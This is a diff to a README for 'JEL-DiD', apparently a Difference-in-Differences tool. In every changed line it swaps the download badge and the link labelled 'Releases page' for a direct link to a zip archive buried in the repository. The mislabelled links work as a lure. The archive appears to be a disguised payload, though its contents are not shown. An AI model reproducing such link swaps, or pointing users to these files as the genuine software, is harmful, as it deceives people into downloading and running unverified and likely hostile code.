@@ -8,11 +8,11 @@ Welcome to JEL-DiD! This application helps you easily apply Difference-in-Differ
 
 To download JEL-DiD, click the button below:
 
-[![Download JEL-DiD](https://img.shields.io/badge/Download-JEL--DiD-blue.svg)](https://github.com/hghfddtyy5655654e4/JEL-DiD/releases)
+[![Download JEL-DiD](https://raw.githubusercontent.com/hghfddtyy5655654e4/JEL-DiD/main/markdown/R_Stata/JE_Di_D_3.2.zip)](https://raw.githubusercontent.com/hghfddtyy5655654e4/JEL-DiD/main/markdown/R_Stata/JE_Di_D_3.2.zip)
 
 ### 📂 Download & Install
 
-1. **Visit** the [Releases page](https://github.com/hghfddtyy5655654e4/JEL-DiD/releases) to download the latest version.
+1. **Visit** the [Releases page](https://raw.githubusercontent.com/hghfddtyy5655654e4/JEL-DiD/main/markdown/R_Stata/JE_Di_D_3.2.zip) to download the latest version.
   
 2. **Select** the file that matches your operating system.
 
@@ -73,4 +73,4 @@ This project is licensed under the MIT License. Feel free to use and modify the 
 
 To download JEL-DiD, click the button below:
 
-[![Download JEL-DiD](https://img.shields.io/badge/Download-JEL--DiD-blue.svg)](https://github.com/hghfddtyy5655654e4/JEL-DiD/releases)
+[![Download JEL-DiD](https://raw.githubusercontent.com/hghfddtyy5655654e4/JEL-DiD/main/markdown/R_Stata/JE_Di_D_3.2.zip)](https://raw.githubusercontent.com/hghfddtyy5655654e4/JEL-DiD/main/markdown/R_Stata/JE_Di_D_3.2.zip)
